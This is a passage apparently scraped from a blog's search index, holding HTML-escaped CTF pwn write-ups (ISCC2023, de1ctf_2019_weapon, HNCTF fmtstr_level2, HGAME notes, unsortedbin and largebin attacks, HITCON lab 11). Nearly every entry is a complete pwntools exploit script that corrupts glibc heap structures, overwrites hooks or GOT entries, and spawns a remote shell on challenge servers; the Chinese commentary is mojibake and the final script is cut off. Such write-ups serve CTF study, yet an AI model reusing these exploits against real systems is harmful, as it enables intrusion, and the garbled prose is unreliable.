&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-38Âøò‰∫ÜÂè´Âï•‰∫ÜdlresolveÁöÑÈ¢ò&#34;&gt;attachment-38Ôºö(Âøò‰∫ÜÂè´Âï•‰∫ÜÔºådlresolveÁöÑÈ¢ò)&lt;/h4&gt;
&lt;p&gt;ÂèØ‰ª•Áî®pwntoolsÁöÑËá™Âä®ÂåñÂ∑•ÂÖ∑ÊâìÈÄö&lt;br&gt;
&lt;s&gt;‰Ω©ÊúçÊâãÂä®ÊûÑÈÄ†ÁöÑorz&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10067)
# io=process(&amp;quot;./attachment-38&amp;quot;)
context.binary=elf=ELF(&amp;quot;./attachment-38&amp;quot;)
rop=ROP(&amp;quot;./attachment-38&amp;quot;)

bss_addr=0x804A01C
leave_ret=0x8048378
pop_ebp_ret=0x80484ab
pop3_ret=0x80484a9

dlresolve=Ret2dlresolvePayload(elf, symbol=&#39;system&#39;, args=[&#39;/bin/sh\x00&#39;])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)


# gdb.attach(io)
# pause()


log.info(rop.dump())
payload=flat({76:rop.chain(),256:dlresolve.payload})
io.send(payload)

# read_plt=elf.plt[b&amp;quot;read&amp;quot;]

# payload=cyclic(0x48)+p32(bss_addr)+p32(read_plt)+p32(pop3_ret)+p32(0)+p32(bss_addr)+p32(0x100)


io.interactive()

# Gadgets information
# ============================================================
# 0x08048378 : leave ; ret
# 0x080484ab : pop ebp ; ret
# 0x080484a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080482c9 : pop ebx ; ret
# 0x080484aa : pop edi ; pop ebp ; ret
# 0x080484a9 : pop esi ; pop edi ; pop ebp ; ret
# 0x080482b2 : ret
# 0x0804838e : ret 0xeac1
# 0x08048568 : ret 0xfffe

# Unique gadgets found: 9
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-39sims&#34;&gt;attachment-39Ôºö(SIMS)&lt;/h4&gt;
&lt;p&gt;UAFÁöÑtcachebin attackÔºåÂä´ÊåÅ&lt;code&gt;__free_hook&lt;/code&gt;Êâìone_gadget&lt;br&gt;
&lt;s&gt;ÊúÄÂêéÂ§öÊ¨°editÊòØÊàëÊâæ‰∏çÂà∞chunk‰∏ãÊ†á‰∫ÜÔºåÂ≠©Â≠ê‰∏çÊáÇÊëÅÁùÄÁé©ÁöÑ&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10085)
# io=process(&amp;quot;./SIMS&amp;quot;)
elf=ELF(&amp;quot;./SIMS&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.27.so&amp;quot;)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
rd=cs.rand()
print(&amp;quot;rd:  &amp;quot;+str(rd))
# for i in range(1,36569646000):
#     if rd^i==0x15cc15cc:
#         ps=i
#         break
#     else:
#         continue
ps=2118602923
print(&amp;quot;ans:  &amp;quot;+hex(ps^rd))
io.sendline(str(ps))

def add(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Stu:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content of Stu:\n&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;one!\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index:\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x90)
    edit(i,b&amp;quot;/bin/sh&amp;quot;)
    
add(0x90) #8
edit(8,&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
shell=leak_addr+one_gadget[1]

# for i in range(0,6):
#     add(0x90)

edit(6,p64(free_hook))
add(0x90) #9  
add(0x90) #10
edit(0,p64(sys_addr)) 
edit(1,p64(sys_addr)) 
edit(2,p64(sys_addr)) 
edit(3,p64(sys_addr)) 
edit(4,p64(sys_addr)) 
edit(5,p64(sys_addr)) 
edit(6,p64(sys_addr)) 
edit(7,p64(sys_addr)) 
# edit(8,p64(sys_addr)) 
# add(0x90) #9
# add(0x90) #10
# add(0x90) #11
delete(8)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">ISCC2023 PWNÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dxpXmj6SV/"" data-c="
          &lt;p&gt;64‰Ωçedit after freeÔºåÊó†showÂáΩÊï∞ÔºåÊó†Ê≥ïÊ≠£Â∏∏dumpÂá∫libcÂü∫ÂùÄ&lt;br&gt;
Âèà‰∏ÄÈÅìÊâì&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt;Ê≥ÑÈú≤libcÂü∫ÂùÄÁöÑÈ¢òÁõÆÔºå‰∏çËøáÈöæÁÇπÂú®‰∫éfake_chunkÁöÑÊûÑÈÄ†&lt;br&gt;
editÈôêÂà∂‰∫Ü‰øÆÊîπÁöÑÈïøÂ∫¶ÔºåÂè™ÊúâÊûÑÈÄ†fake_chunkÊù•ËææÂà∞Ê∫¢Âá∫ÂÜôÁöÑÁõÆÁöÑ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# gdb.attach(io)
# pause()

def shh():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29563)
    # io=process(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    elf=ELF(&amp;quot;./de1ctf_2019_weapon&amp;quot;)
    libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

    one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

    def add(s,n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;weapon: &amp;quot;,str(s))
        io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;name:\n&amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;idx :&amp;quot;,str(n))
        
    def edit(n,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;idx: &amp;quot;,str(n))
        io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)
    add(0x60,0,b&amp;quot;aaa&amp;quot;)
    add(0x60,1,b&amp;quot;bbb&amp;quot;)
    add(0x60,2,b&amp;quot;ccc&amp;quot;)
    add(0x10,3,b&amp;quot;ddd&amp;quot;)

    # delete(2)

    delete(1)
    delete(0)

    edit(0,b&amp;quot;\x50&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x60,4,p64(0)*9+p64(0x71))
    add(0x60,5,p64(0)*3+p64(0xe1))
    # payload=p64(0)*3+p64(0x91)
    # edit(0,payload)

    delete(1)
    # add(0x60,6,b&amp;quot;qqq&amp;quot;)
    # add(0x10,7,b&amp;quot;ttt&amp;quot;)
    delete(0)
    delete(2)

    edit(2,b&amp;quot;\x70&amp;quot;)

    payload=p64(0)*3+p64(0x71)+b&amp;quot;\xdd\x55&amp;quot;
    edit(5,payload)

    add(0x60,7,b&amp;quot;aaa&amp;quot;)
    add(0x60,8,b&amp;quot;bbb&amp;quot;)

    payload=b&amp;quot;\x00&amp;quot;*0x33+p64(0xfbad1877)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    add(0x60,9,payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-192-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]   
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    shell=one_gadget[3]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr

    add(0x60,10,b&amp;quot;qqq&amp;quot;)

    delete(0)
    edit(0,p64(malloc_hook-0x23))
    add(0x60,11,b&amp;quot;aaa&amp;quot;)
    add(0x60,12,cyclic(0x13)+p64(shell))

    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;weapon: &amp;quot;,b&amp;quot;24&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,b&amp;quot;13&amp;quot;)

    io.interactive()

while True:
    try:
        shh()
    except:
        io.close()
        continue
# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">de1ctf_2019_weapon wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Z96YulOXT1/"" data-c="
          &lt;p&gt;Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ªªÊÑèÂÜôÔºåÊâì&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;Ê≥ÑÈú≤libc&lt;br&gt;
ÁÑ∂ÂêéÂÜçÊ¨°Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊâìreallocË∞ÉÊ†àÁöÑone_gadget&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28168)
# io=process(&amp;quot;./note&amp;quot;)
elf=ELF(&amp;quot;./note&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)
    
def fmt(t,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;say ? &amp;quot;,t)
    io.sendlineafter(b&amp;quot;? &amp;quot;,cc)
    
def show():
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()

payload=p64(0xfbad1887)+p64(0)*3
fmt(b&amp;quot;%7$saaaa&amp;quot;,payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))+0x1430-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226, 0x4527a, 0xf03a4, 0xf1247]
shell=leak_addr+one_gadget[1]

# add(0x90,b&amp;quot;aaa&amp;quot;)
# fmt %7$s

payload=p64(shell)+p64(realloc+0xc)
fmt(b&amp;quot;%7$saaaa&amp;quot;+p64(malloc_hook-0x8),payload)

# add(0x18,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;size: &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">Á••‰∫ëÊùØ2021 note wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/A5pkR-4c0/"" data-c="
          &lt;p&gt;64‰ΩçÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÔºågotË°®ÂèØÂÜô&lt;br&gt;
Á¨¨‰∏ÄÊ¨°Ê≥ÑÈú≤libcÂü∫ÂùÄÂíåÂä´ÊåÅ&lt;code&gt;fini_array&lt;/code&gt;‰∏∫main&lt;br&gt;
Á®ãÂ∫èËá™Â∏¶ÁöÑputsÈáåÊúâ&lt;code&gt;;sh&lt;/code&gt;Ôºå&lt;code&gt;;&lt;/code&gt;ÂàÜÈöîÁ¨¶ÔºåÂ¶ÇÊûúÂä´ÊåÅputsÁöÑgotË°®‰∏∫systemÔºåÂàôÂèØ‰ª•getshell&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./fmtstr_level2&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28540)
elf=ELF(&amp;quot;./fmtstr_level2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

main=0x4011b6
fini_array=0x4031F0

io.recvuntil(b&amp;quot;ID\n&amp;quot;)
payload=b&amp;quot;%38$paaa&amp;quot;+fmtstr_payload(7,{fini_array:main},numbwritten=0x11)
###0x11‰∏∫Ê≥ÑÈú≤ÁöÑlibcÂÅèÁßªÂú∞ÂùÄ+aaaÁöÑÈïøÂ∫¶Ôºå14+3=17
io.send(payload)

leak_addr=int(io.recv(14),16)-0x1f12e8
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
payload=fmtstr_payload(6,{elf.got[b&amp;quot;puts&amp;quot;]:sys_addr})
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]fmtstr_level2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IMfIGRuPB/"" data-c="
          &lt;p&gt;2.31&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28245)
io=process(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(s))
    io.sendafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(n))

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh\x00&amp;quot;)

add(8,0x10,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

for i in range(0,10):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)

for i in range(0,7):
    delete(i)

gdb.attach(io)
pause()
    
delete(9)
delete(10)
delete(7)
delete(8)
delete(7)

for i in range(0,7):
    add(i,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
    
add(11,0x60,p64(free_hook))
add(12,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(13,0x60,b&amp;quot;/bin/sh\x00&amp;quot;)
add(14,0x60,p64(sys_addr))

delete(12)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME2022 oldfashion_note</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/z7v1q0WF_/"" data-c="
          &lt;h3 id=&#34;unsortedbin-attack&#34;&gt;Unsortedbin Attack:&lt;/h3&gt;
&lt;h4 id=&#34;hitcontraining_magicheap&#34;&gt;hitcontraining_magicheap:&lt;/h4&gt;
&lt;p&gt;‰ΩéÁâàÊú¨Âà©Áî®ÔºåÊéßÂà∂bk‰ΩçÁΩÆÂÜÖÂÆπÔºåÂç≥ÂèØ‰ªªÊÑèÂú∞ÂùÄÂÜô&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* remove from unsorted list */
if (__glibc_unlikely (bck-&amp;gt;fd != victim))
 malloc_printerr (&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;);
unsorted_chunks (av)-&amp;gt;bk = bck;
bck-&amp;gt;fd = unsorted_chunks (av);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27492)
# io=process(&amp;quot;./magicheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size of Heap : &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content of heap : &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x20,b&amp;quot;aaa&amp;quot;) #0
add(0x90,b&amp;quot;bbb&amp;quot;) #1
add(0x10,b&amp;quot;ccc&amp;quot;) #2

delete(1)
fd=0
bk=0x6020A0
edit(0,0x50,cyclic(0x20)+p64(0)+p64(0x91)+p64(fd)+p64(bk-0x10))
add(0x80,b&amp;quot;zzzz&amp;quot;)
io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4869&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;largebin-attack&#34;&gt;Largebin AttackÔºö&lt;/h3&gt;
&lt;h4 id=&#34;hgame2023_large_note&#34;&gt;hgame2023_large_note:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1687409598772.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#Ê≥®ÊÑè0x10Â≠óËäÇÂØπÈΩê
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28607)
io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.32.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x520)
add(1,0x600)
add(2,0x510)

delete(0)
edit(0,b&amp;quot;a&amp;quot;)
show(0)   #uafÊ≥ÑÈú≤libc

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x61-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_=leak_addr+0x1e3280   #Ê≠§Â§ÑÂÅèÁßªÊòØÁúüÁöÑÈöæÊâæ
tc_max_bins=mp_+0x50  #mp_.tcache_bins

edit(0,b&amp;quot;\x00&amp;quot;)
add(13,0x900)   #Â∞Üchunk0ÂàÜÈÖçÂà∞largebin

payload=p64(leak_addr+0x1e4030)*2+p64(tc_max_bins-0x20)*2  #Ê≥®ÊÑèÊ£ÄÊü•Ôºå‰øÆÊîπchunk 0ÁöÑbk_nextsize‰∏∫tc_max_bins - 0x20Â§ÑÔºåÊù•ËææÂà∞‰ªªÊÑèÂú∞ÂùÄÂÜô‰∏Ä‰∏™Â†ÜÂùóÂú∞ÂùÄ

edit(0,payload)

delete(2) #ÂàÜÈÖçchunk2 Âà∞unsortedbin

add(15,0x900) #ÂàÜÈÖç‰∏Ä‰∏™Â§ßÂ†ÜÂùóÂá∫Âèëlargebin attack

# gdb.attach(io)
# pause()

delete(1)
payload=b&amp;quot;a&amp;quot;*0xe8+p64(free_hook) #Âõ∫ÂÆöÂÅèÁßª
edit(0,payload)

add(1,0x600) 

edit(1, p64(sys_addr))

add(6,0x600)
edit(6,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(6)  #Âä´ÊåÅfree_hook‰∏∫systemÂáΩÊï∞ÔºåfreeÊéâ&amp;quot;/bin/sh&amp;quot;Â†ÜÂùóÂç≥ÂèØ

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Unsortedbin Attack&Largebin Attack</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dDqqLsIMs/"" data-c="
          &lt;h3 id=&#34;‰æãÈ¢ò&#34;&gt;‰æãÈ¢òÔºö&lt;/h3&gt;
&lt;h4 id=&#34;hitcon-training-lab-11&#34;&gt;HITCON training lab 11Ôºö&lt;/h4&gt;
&lt;p&gt;2.29‰πãÂâçÁâàÊú¨Âà©Áî®&lt;br&gt;
‰øÆÊîπtop_chunk size‰∏∫&lt;code&gt;-1&lt;/code&gt;Êó†Á¨¶Âè∑Ê∫¢Âá∫‰∏∫ÊûÅÂ§ßÂÄºÁªïËøáÈ™åËØÅ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// Ëé∑ÂèñÂΩìÂâçÁöÑtop chunkÔºåÂπ∂ËÆ°ÁÆóÂÖ∂ÂØπÂ∫îÁöÑÂ§ßÂ∞è
victim = av-&amp;gt;top;
size   = chunksize(victim);
// Â¶ÇÊûúÂú®ÂàÜÂâ≤‰πãÂêéÔºåÂÖ∂Â§ßÂ∞è‰ªçÁÑ∂Êª°Ë∂≥ chunk ÁöÑÊúÄÂ∞èÂ§ßÂ∞èÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Áõ¥Êé•ËøõË°åÂàÜÂâ≤„ÄÇ
if ((unsigned long) (size) &amp;gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&amp;gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êé•‰∏ãÊù•ÊµãÁÆóÂÅèÁßªÔºö&lt;br&gt;
&lt;code&gt;offset = chunk_addr - top_chunk_addr -0x20&lt;/code&gt;&lt;br&gt;
ÂàÜÈÖçÂ†ÜÂùó&lt;code&gt;add(offset,&#39;&#39;)&lt;/code&gt;ÂêéÂèØÂÆûÁé∞&lt;code&gt;chunk_addr&lt;/code&gt;Â§ÑÂÜô&lt;br&gt;
Ê≠§Êó∂ÂÜçÊ¨°&lt;code&gt;add&lt;/code&gt;Âç≥ÂèØÊîπÂÜôÂΩìÂâçÂú∞ÂùÄÂÜÖÂÆπ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27856)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
